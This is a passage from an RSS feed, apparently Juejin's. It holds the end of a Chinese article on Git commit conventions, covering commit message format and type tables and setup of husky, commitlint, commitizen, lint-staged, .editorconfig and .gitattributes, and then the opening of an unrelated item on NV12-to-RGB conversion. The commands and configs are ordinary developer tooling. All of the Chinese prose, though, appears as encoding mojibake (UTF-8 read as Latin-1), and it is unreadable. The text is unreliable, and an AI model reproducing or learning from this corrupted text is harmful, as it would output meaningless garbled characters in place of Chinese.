<li><code>commitizen</code> æœ¬èº«æ˜¯å¹³å°ï¼Œéœ€è¦é…ç½®ä¸€ä¸ªé€‚é…å™¨ï¼ˆadapterï¼‰</li>
<li>å¸¸è§é€‚é…å™¨ï¼š<code>cz-conventional-changelog</code>ï¼ˆç»å…¸ã€æœ€å°ä¾èµ–ï¼‰ã€<code>cz-git</code>ï¼ˆæ›´çµæ´»ï¼Œå¯æ‰©å±•ä¸­æ–‡/emoji ç­‰ï¼‰</li>
<li>å‘½ä»¤ï¼š<code>git-cz</code>ï¼ˆä»¥åŠç­‰ä»·çš„ <code>cz</code>ï¼‰</li>
</ul>
<h3 data-id="heading-6">0.6 Lint-stagedï¼ˆåªæ£€æŸ¥æš‚å­˜åŒºæ–‡ä»¶ï¼‰</h3>
<p><code>lint-staged</code> ä¼šè‡ªåŠ¨è·å– Git æš‚å­˜åŒºï¼ˆstagedï¼‰çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¹¶åªå¯¹è¿™äº›æ–‡ä»¶è¿è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œé¿å…æ¯æ¬¡æäº¤éƒ½å…¨é‡ lintã€‚</p>
<h3 data-id="heading-7">0.7 å®ƒä»¬å¦‚ä½•åä½œï¼ˆä¸€æ¬¡æäº¤çš„æ‰§è¡Œé¡ºåºï¼‰</h3>
<p>å½“ä½ æ‰§è¡Œ <code>git commit</code> æ—¶ï¼Œé€šå¸¸ä¼šæŒ‰ä»¥ä¸‹é¡ºåºå‘ç”Ÿï¼š</p>
<ol start="0">
<li><code>pre-commit</code>ï¼šè¿è¡Œ <code>lint-staged</code>ï¼ˆå¯¹æš‚å­˜åŒºæ–‡ä»¶åšæ ¡éªŒ/æ ¼å¼åŒ–ï¼‰</li>
<li>ç¼–è¾‘/ç”Ÿæˆ commit messageï¼šæ‰‹å†™æˆ–ä½¿ç”¨ <code>commitizen</code></li>
<li><code>commit-msg</code>ï¼šè¿è¡Œ <code>commitlint</code>ï¼ˆæ ¡éªŒ commit messageï¼‰</li>
<li>é€šè¿‡åæäº¤è½åº“</li>
</ol>
<hr/>
<h2 data-id="heading-8">1. Commit Message ç»Ÿä¸€æ ¼å¼ï¼ˆå¿…é¡»ï¼‰</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>)!: <span class="hljs-tag">&lt;<span class="hljs-name">subject</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
â€‹
<span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>
</code></pre>
<ul>
<li><code>&lt;type&gt;</code>ï¼šå˜æ›´ç±»å‹ï¼ˆå¿…å¡«ï¼Œå°å†™ï¼‰</li>
<li><code>(&lt;scope&gt;)</code>ï¼šå½±å“èŒƒå›´ï¼ˆå¯é€‰ï¼Œå»ºè®®å¡«ï¼‰</li>
<li><code>!</code>ï¼šç ´åæ€§å˜æ›´ï¼ˆBreaking Changeï¼Œå¯é€‰ï¼‰</li>
<li><code>&lt;subject&gt;</code>ï¼šä¸€å¥è¯æ¦‚æ‹¬å˜æ›´ï¼ˆå¿…å¡«ï¼‰</li>
<li><code>&lt;body&gt;</code>ï¼šä¸ºä»€ä¹ˆæ”¹ã€æ€ä¹ˆæ”¹ã€å½±å“ç‚¹ï¼ˆå¯é€‰ï¼Œä½†æ¨èåœ¨å¤æ‚æäº¤ä¸­å¡«å†™ï¼‰</li>
<li><code>&lt;footer&gt;</code>ï¼šå…³è” Issue/PRã€Breaking Change è¯´æ˜ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<h3 data-id="heading-9">1.1 subjectï¼ˆå¿…é¡»ï¼‰</h3>
<ul>
<li>ç”¨ç¥ˆä½¿å¥/åŠ¨è¯å¼€å¤´ï¼ˆä¸­æ–‡ä¹Ÿç­‰ä»·ï¼‰ï¼šä¾‹å¦‚â€œæ–°å¢â€¦/ä¿®å¤â€¦/è°ƒæ•´â€¦â€</li>
<li>ç®€çŸ­ã€å…·ä½“ã€å¯è¯»ï¼šä¼˜å…ˆè¯´æ˜â€œåšäº†ä»€ä¹ˆâ€ï¼Œè€Œä¸æ˜¯â€œæ”¹äº†ä»€ä¹ˆæ–‡ä»¶â€</li>
<li>ä¸è¦ä»¥å¥å·ç»“å°¾ï¼›ä¸è¦å†™æ— æ„ä¹‰æè¿°ï¼ˆå¦‚â€œupdateâ€ã€â€œfix bugâ€ï¼‰</li>
<li>å»ºè®®æ§åˆ¶åœ¨ 100 å­—ç¬¦å†…ï¼ˆä¸ <code>commitlint</code> çš„ <code>header-max-length</code> ä¿æŒä¸€è‡´ï¼‰</li>
</ul>
<h3 data-id="heading-10">1.2 bodyï¼ˆæ¨èï¼‰</h3>
<p>å½“å˜æ›´ä¸æ­¢ä¸€å¤„ã€å­˜åœ¨æƒè¡¡æˆ–å½±å“é¢è¾ƒå¤§æ—¶ï¼Œå»ºè®®å†™ bodyï¼š</p>
<ul>
<li>èƒŒæ™¯/åŸå› ï¼šä¸ºä»€ä¹ˆè¦æ”¹</li>
<li>æ–¹æ¡ˆ/å®ç°ï¼šæ€ä¹ˆæ”¹çš„</li>
<li>å½±å“/é£é™©ï¼šæœ‰å“ªäº›å…¼å®¹æ€§æˆ–ä¸Šçº¿æ³¨æ„ç‚¹</li>
</ul>
<h3 data-id="heading-11">1.3 footerï¼ˆæŒ‰éœ€ï¼‰</h3>
<ul>
<li>
<p>å…³è” Issue/ä»»åŠ¡ï¼š<code>Closes #123</code>ã€<code>Refs #123</code></p>
</li>
<li>
<p>ç ´åæ€§å˜æ›´ï¼ˆä¸¤ç§å†™æ³•äºŒé€‰ä¸€ï¼‰ï¼š</p>
<ul>
<li>åœ¨ header é‡Œä½¿ç”¨ <code>!</code></li>
<li>æˆ–åœ¨ footer å†™ï¼š<code>BREAKING CHANGE: xxx</code></li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">2. type ä¸ scope çº¦å®šï¼ˆå¿…é¡»ç»Ÿä¸€ï¼‰</h2>
<h3 data-id="heading-13">2.1 æ¨è type åˆ—è¡¨ï¼ˆå»ºè®®ä¸ commitlint é…ç½®ä¿æŒä¸€è‡´ï¼‰</h3>






































































<table><thead><tr><th>type</th><th>ç”¨é€”</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>feat</td><td>æ–°å¢åŠŸèƒ½</td><td><code>feat(auth): æ”¯æŒçŸ­ä¿¡ç™»å½•</code></td></tr><tr><td>fix</td><td>ä¿®å¤ç¼ºé™·</td><td><code>fix(router): ä¿®å¤é‡å®šå‘æ­»å¾ªç¯</code></td></tr><tr><td>docs</td><td>æ–‡æ¡£å˜æ›´</td><td><code>docs: æ›´æ–°å®‰è£…è¯´æ˜</code></td></tr><tr><td>style</td><td>ä»…æ ¼å¼/æ ·å¼ï¼ˆä¸å½±å“é€»è¾‘ï¼‰</td><td><code>style: æ ¼å¼åŒ–ä»£ç </code></td></tr><tr><td>refactor</td><td>é‡æ„ï¼ˆé feat/fixï¼‰</td><td><code>refactor(core): æ‹†åˆ†æ ¡éªŒé€»è¾‘</code></td></tr><tr><td>perf</td><td>æ€§èƒ½ä¼˜åŒ–</td><td><code>perf(list): ä¼˜åŒ–é¦–å±æ¸²æŸ“</code></td></tr><tr><td>test</td><td>æµ‹è¯•ç›¸å…³</td><td><code>test: è¡¥å……ç™»å½•å•æµ‹</code></td></tr><tr><td>build</td><td>æ„å»º/ä¾èµ–/æ‰“åŒ…</td><td><code>build: å‡çº§ pnpm ç‰ˆæœ¬</code></td></tr><tr><td>ci</td><td>CI é…ç½®ä¸è„šæœ¬</td><td><code>ci: æ·»åŠ å‘å¸ƒæµæ°´çº¿</code></td></tr><tr><td>chore</td><td>æ‚é¡¹ï¼ˆä¸å½±å“ä¸šåŠ¡/åŠŸèƒ½ï¼‰</td><td><code>chore: æ›´æ–°ä¾èµ–ä¸è„šæ‰‹æ¶é…ç½®</code></td></tr><tr><td>revert</td><td>å›æ»šæäº¤</td><td><code>revert: feat(auth): æ”¯æŒçŸ­ä¿¡ç™»å½•</code></td></tr><tr><td>wip</td><td>å¼€å‘ä¸­ä¸´æ—¶æäº¤ï¼ˆæ…ç”¨ï¼‰</td><td><code>wip: è°ƒè¯•ç™»å½•æ€</code></td></tr></tbody></table>
<p>å»ºè®®ï¼š<code>wip</code> ä»…ç”¨äºä¸ªäººåˆ†æ”¯ï¼›åˆå¹¶åˆ°ä¸»åˆ†æ”¯å‰åº”é€šè¿‡ <code>rebase/squash</code> æ¸…ç†æˆæœ‰æ„ä¹‰çš„æäº¤ã€‚</p>
<h3 data-id="heading-14">2.2 scope å–å€¼å»ºè®®ï¼ˆå¯é€‰ä½†æ¨èï¼‰</h3>
<p>scope ç”¨æ¥è¯´æ˜å½±å“èŒƒå›´ï¼Œå»ºè®®ä½¿ç”¨â€œæ¨¡å—/é¢†åŸŸ/ç›®å½•åâ€ï¼Œä¿æŒçŸ­ä¸”ç¨³å®šï¼š</p>
<ul>
<li>ä¸šåŠ¡åŸŸï¼š<code>auth</code>ã€<code>user</code>ã€<code>order</code></li>
<li>åŸºç¡€è®¾æ–½ï¼š<code>router</code>ã€<code>store</code>ã€<code>api</code></li>
<li>å·¥ç¨‹åŒ–ï¼š<code>build</code>ã€<code>ci</code>ã€<code>deps</code></li>
<li>æ–‡æ¡£/é…ç½®ï¼š<code>readme</code>ã€<code>eslint</code>ã€<code>prettier</code></li>
</ul>
<hr/>
<h2 data-id="heading-15">3. ç¤ºä¾‹ï¼ˆç›´æ¥ç…§æŠ„å³å¯ï¼‰</h2>
<ul>
<li>æ™®é€šæäº¤ï¼š<code>feat: æ–°å¢å¯¼å‡ºåŠŸèƒ½</code></li>
<li>å¸¦ scopeï¼š<code>fix(auth): ä¿®å¤ token åˆ·æ–°å¤±è´¥</code></li>
<li>ç ´åæ€§å˜æ›´ï¼š<code>feat(api)!: è°ƒæ•´ç”¨æˆ·æ¥å£è¿”å›ç»“æ„</code></li>
</ul>
<p>å¸¦ body/footerï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">feat</span>(user): æ–°å¢ä¸ªäººèµ„æ–™ç¼–è¾‘
â€‹
- æ”¯æŒå¤´åƒä¸Šä¼ ä¸è£å‰ª
- å¢åŠ è¾“å…¥æ ¡éªŒä¸é”™è¯¯æç¤º
â€‹
Closes <span class="hljs-number">#123</span>
</code></pre>
<hr/>
<h2 data-id="heading-16">4. å·¥å…·é“¾è½åœ°ï¼ˆä¸€ï¼‰ï¼šæäº¤ä¿¡æ¯è§„èŒƒï¼ˆcommitlint + commitizenï¼‰</h2>
<p>ç›®æ ‡ï¼šåœ¨æœ¬åœ°æ‹¦æˆªä¸åˆè§„çš„ commit messageï¼Œå¹¶æä¾›ä½æˆæœ¬çš„è§„èŒƒåŒ–æäº¤æ–¹å¼ã€‚</p>
<h3 data-id="heading-17">4.1 å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-sql" lang="sql">pnpm <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>D husky <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>cli <span class="hljs-variable">@commitlint</span><span class="hljs-operator">/</span>config<span class="hljs-operator">-</span>conventional commitizen
</code></pre>
<h3 data-id="heading-18">4.2 åˆå§‹åŒ– Husky</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> husky init
</code></pre>
<p>åˆå§‹åŒ–åé€šå¸¸ä¼šå‘ç”Ÿè¿™äº›å˜åŒ–ï¼ˆä»¥ Husky 9+ ä¸ºä¾‹ï¼‰ï¼š</p>
<ul>
<li>æ–°å¢ <code>.husky/</code> ç›®å½•ï¼ˆç”¨äºå­˜æ”¾ hooksï¼‰</li>
<li>ç”Ÿæˆ <code>.husky/pre-commit</code>ï¼ˆHusky åˆå§‹åŒ–ä¼šæ”¾ä¸€ä¸ªé»˜è®¤ç¤ºä¾‹ï¼Œå¸¸è§é»˜è®¤å†…å®¹æ˜¯ <code>pnpm test</code>ï¼Œå¯æŒ‰é¡¹ç›®éœ€è¦æ”¹æˆ <code>lint-staged</code>ï¼‰</li>
<li>åœ¨ <code>package.json</code> å†™å…¥/æ›´æ–° <code>prepare</code> è„šæœ¬ï¼Œç¡®ä¿å®‰è£…ä¾èµ–åä¼šè‡ªåŠ¨å¯ç”¨ hooks</li>
</ul>
<p>ç¡®ä¿ <code>package.json</code> è‡³å°‘åŒ…å«ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"prepare"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"husky"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-19">4.3 ç¬¬ä¸€æ­¥ï¼šåªé…ç½® commitlintï¼ˆå…ˆæ ¡éªŒï¼Œå†å¼•å¯¼ï¼‰</h3>
<ol start="0">
<li>åˆ›å»º <code>commitlint.config.ts</code>ï¼š</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
 Â <span class="hljs-keyword">extends</span>: [<span class="hljs-string">'@commitlint/config-conventional'</span>],
}
</code></pre>
<blockquote>
<p>åç»­æ ¹æ®éœ€æ±‚å¯ä¸°å¯Œé…ç½®</p>
</blockquote>
<ol start="2">
<li>é…ç½® <code>.husky/commit-msg</code>ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> commitlint --edit <span class="hljs-variable">$1</span>
</code></pre>
<p>å…³äº <code>pnpm exec</code> ä¸ <code>pnpm dlx</code>ï¼š</p>
<ul>
<li><code>pnpm exec</code>ï¼šæ‰§è¡Œ<strong>å½“å‰é¡¹ç›®å·²å®‰è£…</strong>çš„ä¾èµ–ï¼ˆä» <code>node_modules/.bin</code> è§£æå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼›å›¢é˜Ÿåä½œä¸‹æ›´ç¨³å®šã€ç‰ˆæœ¬å¯æ§ï¼ˆæ¨èï¼‰</li>
<li><code>pnpm dlx</code>ï¼šä¸´æ—¶ä¸‹è½½å¹¶æ‰§è¡ŒæŸä¸ªåŒ…ï¼ˆä¸€æ¬¡æ€§è¿è¡Œå·¥å…·æ—¶æ–¹ä¾¿ï¼‰ï¼Œä½†ç‰ˆæœ¬å¯èƒ½éšæ—¶é—´å˜åŒ–ï¼Œä¸é€‚åˆä½œä¸ºä»“åº“é•¿æœŸ hooks ä¾èµ–</li>
</ul>
<p><code>pnpm exec commitlint --edit $1</code> çš„å·¥ä½œæµç¨‹ï¼ˆç®€è¿°ï¼‰ï¼š</p>
<ol start="0">
<li><code>git commit</code> è§¦å‘ <code>commit-msg</code> hook</li>
<li>Husky æ‰§è¡Œ <code>.husky/commit-msg</code></li>
<li><code>pnpm exec</code> åœ¨å½“å‰é¡¹ç›®ä¸­è§£æåˆ° <code>commitlint</code> å¯æ‰§è¡Œæ–‡ä»¶</li>
<li><code>commitlint</code> è¯»å– <code>commitlint.config.*</code> ç­‰é…ç½®</li>
<li><code>commitlint</code> è¯»å– <code>$1</code> æŒ‡å‘çš„ commit message ä¸´æ—¶æ–‡ä»¶å¹¶æ ¡éªŒ</li>
<li>æ ¡éªŒå¤±è´¥è¿”å›é 0ï¼ŒGit ä¸­æ­¢æäº¤ï¼›æ ¡éªŒé€šè¿‡åˆ™ç»§ç»­æäº¤</li>
</ol>
<h4 data-id="heading-20">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨ä½¿ç”¨ <code>git commit -m "..."</code> æäº¤æ—¶ï¼Œå¦‚æœ message ä¸ç¬¦åˆè§„èŒƒï¼Œä¼šè¢«ç›´æ¥æ‹¦æˆª</li>
<li>ä½†è¿™ä¸€æ­¥ä»ä¾èµ–â€œæ‰‹å†™ messageâ€ï¼Œå¯¹æ–°äººæˆ–é«˜é¢‘æäº¤åœºæ™¯ä¸å¤Ÿå‹å¥½</li>
</ul>
<h3 data-id="heading-21">4.4 ç¬¬äºŒæ­¥ï¼šé…ç½® commitizenï¼ˆäº¤äº’å¼ç”Ÿæˆ commit messageï¼‰</h3>
<p>å½“ä½ å®‰è£… <code>commitizen</code> åï¼Œä¼šè·å¾—ä¸¤ä¸ªç­‰ä»·å‘½ä»¤ï¼š</p>
<ul>
<li><code>git-cz</code>ï¼šå®Œæ•´å‘½ä»¤åï¼Œæ›´ç›´è§‚ï¼ˆæ¨èï¼‰</li>
<li><code>cz</code>ï¼šç®€å†™åˆ«åï¼Œè¾“å…¥æ›´çŸ­</li>
</ul>
<p>å®ƒä»¬éƒ½ç”¨äºå¯åŠ¨äº¤äº’å¼æäº¤æµç¨‹ï¼Œå·®åˆ«ä»…åœ¨å‘½ä»¤åã€‚</p>
<ol start="0">
<li>é€‰æ‹©ä¸€ä¸ªé€‚é…å™¨ï¼ˆäºŒé€‰ä¸€å®‰è£…ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D cz-conventional-changelog
<span class="hljs-meta"># æˆ–</span>
pnpm <span class="hljs-keyword">add</span> -D cz-git
</code></pre>
<ol start="2">
<li>åœ¨ <code>package.json</code> ä¸­é…ç½®é€‚é…å™¨ï¼š</li>
</ol>
<ul>
<li>ä½¿ç”¨ <code>cz-conventional-changelog</code>ï¼š</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-conventional-changelog"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>ä½¿ç”¨ <code>cz-git</code>ï¼š</li>
</ul>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commitizen"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cz-git"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>å¢åŠ ç»Ÿä¸€å…¥å£è„šæœ¬ï¼ˆæ¨èï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"commit"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"git-cz"</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span>
</code></pre>
<p>æäº¤æ–¹å¼ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">git <span class="hljs-keyword">add</span> <span class="hljs-operator">-</span>A
pnpm <span class="hljs-keyword">commit</span>
</code></pre>
<h4 data-id="heading-22">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨å›¢é˜Ÿå¯ä»¥é€šè¿‡äº¤äº’å¼æ–¹å¼ç”Ÿæˆè§„èŒƒ messageï¼Œå‡ºé”™ç‡æ˜¾è‘—é™ä½</li>
<li><code>commitlint</code> ä»ç„¶ä¿ç•™ï¼šå³ä½¿æœ‰äººç»•è¿‡äº¤äº’æ‰‹å†™ messageï¼Œä¹Ÿä¼šè¢«æ ¡éªŒå…œåº•</li>
</ul>
<hr/>
<h2 data-id="heading-23">5. å·¥å…·é“¾è½åœ°ï¼ˆäºŒï¼‰ï¼špre-commit æ ¡éªŒï¼ˆlint-stagedï¼‰</h2>
<p>ç›®æ ‡ï¼šåœ¨æäº¤å‰åªå¯¹â€œæš‚å­˜åŒºæ–‡ä»¶â€æ‰§è¡Œæ ¡éªŒ/æ ¼å¼åŒ–ï¼Œé¿å…æŠŠä¸åˆè§„ä»£ç å¸¦è¿›ä»“åº“ã€‚</p>
<h3 data-id="heading-24">5.1 å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">add</span> -D lint-staged
</code></pre>
<p>è¯´æ˜ï¼š<code>lint-staged</code> åªè´Ÿè´£â€œæŒ‘é€‰æš‚å­˜åŒºæ–‡ä»¶å¹¶è¿è¡Œå‘½ä»¤â€ï¼Œå¹¶ä¸è‡ªå¸¦è§„åˆ™ï¼›ä½ éœ€è¦è‡ªè¡Œé€‰æ‹©å¹¶é…ç½® <code>eslint/prettier/stylelint</code> ç­‰å·¥å…·ã€‚</p>
<h3 data-id="heading-25">5.2 é…ç½® lint-stagedï¼ˆç¤ºä¾‹ï¼‰</h3>
<p>åˆ›å»º <code>.lintstagedrc.json</code>ï¼š</p>
<pre><code class="hljs language-less" lang="less">{
 Â "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"eslint --fix --cache"</span>]</span>,
 Â "*.{<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">vue</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"stylelint --fix"</span>]</span>,
 Â "*.{<span class="hljs-selector-tag">js</span>,<span class="hljs-selector-tag">jsx</span>,<span class="hljs-selector-tag">ts</span>,<span class="hljs-selector-tag">tsx</span>,<span class="hljs-selector-tag">vue</span>,<span class="hljs-selector-tag">css</span>,<span class="hljs-selector-tag">scss</span>,<span class="hljs-selector-tag">sass</span>,<span class="hljs-selector-tag">less</span>,<span class="hljs-selector-tag">json</span>,<span class="hljs-selector-tag">md</span>,<span class="hljs-selector-tag">html</span>}": <span class="hljs-selector-attr">[<span class="hljs-string">"prettier --write"</span>]</span>
}
</code></pre>
<h3 data-id="heading-26">5.3 é…ç½® pre-commit hook</h3>
<p>ç¼–è¾‘ <code>.husky/pre-commit</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> lint-staged
</code></pre>
<h4 data-id="heading-27">é˜¶æ®µæ€»ç»“</h4>
<ul>
<li>ç°åœ¨æ¯æ¬¡æäº¤éƒ½ä¼šè‡ªåŠ¨å¯¹æš‚å­˜åŒºæ–‡ä»¶åšæ ¡éªŒ/æ ¼å¼åŒ–</li>
<li>ä¸é€šè¿‡åˆ™æäº¤å¤±è´¥ï¼Œä»æºå¤´å‡å°‘â€œæäº¤åæ‰å‘ç° lint æŠ¥é”™/æ ¼å¼ä¸ç»Ÿä¸€â€çš„æˆæœ¬</li>
</ul>
<hr/>
<h2 data-id="heading-28">6. è·¨å¹³å°ä¸€è‡´æ€§ï¼ˆå¼ºçƒˆå»ºè®®ï¼‰</h2>
<p>ç›®æ ‡ï¼šé¿å… Windows/macOS/Linux æ¢è¡Œç¬¦å·®å¼‚å¯¼è‡´çš„â€œæ— æ„ä¹‰ diffâ€ã€‚</p>
<h3 data-id="heading-29">6.1 <code>.editorconfig</code>ï¼ˆç¼–è¾‘å™¨å±‚ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">root</span> = <span class="hljs-literal">true</span>
â€‹
<span class="hljs-section">[*]</span>
<span class="hljs-attr">charset</span> = utf-<span class="hljs-number">8</span>
<span class="hljs-attr">indent_style</span> = space
<span class="hljs-attr">indent_size</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">end_of_line</span> = lf
<span class="hljs-attr">insert_final_newline</span> = <span class="hljs-literal">true</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">true</span>
â€‹
<span class="hljs-section">[*.md]</span>
<span class="hljs-attr">trim_trailing_whitespace</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-30">6.2 <code>.gitattributes</code>ï¼ˆGit å±‚ï¼‰</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">* <span class="hljs-keyword">text</span>=<span class="hljs-keyword">auto</span> eol=lf
â€‹
*.png  <span class="hljs-keyword">binary</span>
*.jpg  <span class="hljs-keyword">binary</span>
*.jpeg <span class="hljs-keyword">binary</span>
*.gif  <span class="hljs-keyword">binary</span>
*.pdf  <span class="hljs-keyword">binary</span>
</code></pre>
<h3 data-id="heading-31">6.3 <code>.editorconfig</code> vs <code>.gitattributes</code>ï¼ˆåŒºåˆ«ä¸é…åˆï¼‰</h3>
<p>ä¸¤è€…ç»å¸¸ä¸€èµ·ç”¨ï¼Œä½†å…³æ³¨ç‚¹ä¸åŒï¼š</p>
<ul>
<li>ç”Ÿæ•ˆå±‚çº§ä¸åŒï¼š<code>.editorconfig</code> å½±å“â€œç¼–è¾‘å™¨/æ ¼å¼åŒ–å™¨åœ¨ä¿å­˜æ—¶æ€ä¹ˆå†™æ–‡ä»¶â€ï¼Œ<code>.gitattributes</code> å½±å“â€œGit åœ¨æ£€å‡º/æäº¤æ—¶æ€ä¹ˆè§„èŒƒåŒ–æ–‡ä»¶â€</li>
<li>è§£å†³é—®é¢˜ä¸åŒï¼š<code>.editorconfig</code> ç»Ÿä¸€ç¼©è¿›ã€ç¼–ç ã€è¡Œå°¾ç©ºç™½ã€æ˜¯å¦ä¿ç•™æœ«å°¾æ¢è¡Œï¼›<code>.gitattributes</code> ç»Ÿä¸€æ¢è¡Œç¬¦ã€æ ‡è®°äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆé¿å… diff ä¹±ç ï¼‰ã€ä»¥åŠ diff/merge ç­–ç•¥ç­‰</li>
<li>æœ€ä½³å®è·µï¼šä¸¤è€…é…åˆä½¿ç”¨ï¼Œæ—¢çº¦æŸå¼€å‘æ—¶çš„å†™å…¥è¡Œä¸ºï¼Œä¹Ÿä¿è¯ä»“åº“å±‚é¢çš„è·¨å¹³å°ä¸€è‡´æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-32">7. å¸¸è§é—®é¢˜ï¼ˆæ’éšœé€ŸæŸ¥ï¼‰</h2>
<ul>
<li>Husky ä¸ç”Ÿæ•ˆï¼šç¡®è®¤æ‰§è¡Œè¿‡ <code>pnpm install</code> ä¸” <code>prepare</code> è„šæœ¬å·²è¿è¡Œï¼›å¿…è¦æ—¶æ£€æŸ¥ <code>git config core.hooksPath</code> æ˜¯å¦æŒ‡å‘ <code>.husky</code></li>
<li>ç´§æ€¥ç»•è¿‡æ ¡éªŒï¼š<code>git commit --no-verify</code>ï¼ˆä»…é™ç´§æ€¥æƒ…å†µï¼Œåç»­éœ€è¡¥è§„èŒƒæäº¤ï¼‰</li>
<li>Windows ä¸‹äº¤äº’æäº¤ä½“éªŒä¸ä½³ï¼šä¼˜å…ˆä½¿ç”¨ <code>pnpm commit</code>ï¼Œä¸è¦å¼ºåˆ¶åœ¨ hook ä¸­è¿›å…¥äº¤äº’å¼ç•Œé¢</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NV12 è½¬ RGB å®Œæ•´æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592515924701724707</link>    <guid>https://juejin.cn/post/7592515924701724707</guid>    <pubDate>2026-01-08T07:48:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924701724707" data-draft-id="7592622563545956387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NV12 è½¬ RGB å®Œæ•´æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T07:48:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚ å“‰æ‘¸é±¼å¤§ç‹"/> <meta itemprop="url" content="https://juejin.cn/user/3606845069731848"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NV12 è½¬ RGB å®Œæ•´æŒ‡å—
